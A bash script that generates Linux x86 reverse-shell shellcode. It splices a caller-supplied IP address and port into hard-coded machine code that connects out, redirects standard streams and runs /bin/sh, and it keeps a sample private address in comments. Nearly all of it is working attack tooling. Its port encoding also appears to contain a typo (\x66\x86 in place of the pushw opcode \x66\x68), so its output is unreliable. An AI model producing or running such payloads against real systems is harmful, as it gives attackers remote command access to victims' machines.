#!/bin/bash

part_1="\x31\xdb\xf7\xe3\x50\xb0\x66\xb3\x01\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xfe\xc3\x68"
#\xc0\xa8\x58\x80\x66\x68\x11\x5c
#\xc0\xa8\x63\x80\       \x11\x5c
part_2="\x66\x53\x89\xe6\x6a\x10\x56\x52\x89\xe1\xb0\x66\xfe\xc3\xcd\x80\x89\xd3\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x8d\x0c\x24\xb0\x0b\xcd\x80"

ip=$1

if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        if [[ ${ip[0]} -gt 255 ]] || [[ ${ip[1]} -gt 255 ]] \
            || [[ ${ip[2]} -gt 255 ]] || [[ ${ip[3]} -gt 255 ]]; then
                echo "Invalid IP address"
                exit 1
        fi
        if [[ ${ip[0]} -eq 0 ]] || [[ ${ip[1]} -eq 0 ]] \
                        || [[ ${ip[2]} -eq 0 ]] || [[ ${ip[3]} -eq 0 ]]; then
                echo "IP contains nulls, aborting"
                exit 1
        fi

     byte1=`echo "obase=16; if(${ip[0]}<16) print 0; ${ip[0]}" | bc`
     byte2=`echo "obase=16; if(${ip[1]}<16) print 0; ${ip[1]}" | bc`
     byte3=`echo "obase=16; if(${ip[2]}<16) print 0; ${ip[2]}" | bc`
     byte4=`echo "obase=16; if(${ip[3]}<16) print 0; ${ip[3]}" | bc`

        hex_ip=`echo "\x$byte1\x$byte2\x$byte3\x$byte4" | tr '[:upper:]' '[:lower:]'`
        echo $hex_ip
fi

if [[ $2 -gt 1 ]] && [[ $2 -lt 256 ]]; then
        echo "Port values between 1 and 255 are unsupported, encoding is required"
        exit 1
elif [[ $2 -gt 255 ]] && [[ $2 -lt 65536 ]]; then
        v=`echo "obase=16; $2" | bc`
        if [[ 0x${v:2:2} -eq 0x0 ]]; then
                echo "Port contains nulls, requires encoding"
                exit 1
        fi
        port=`echo "\x66\x86\x${v:0:2}\x${v:2:2}" | tr '[:upper:]' '[:lower:]'`
else
        echo "Invalid port specified."
        exit 1
fi

echo $part_1$hex_ip$port$part_2
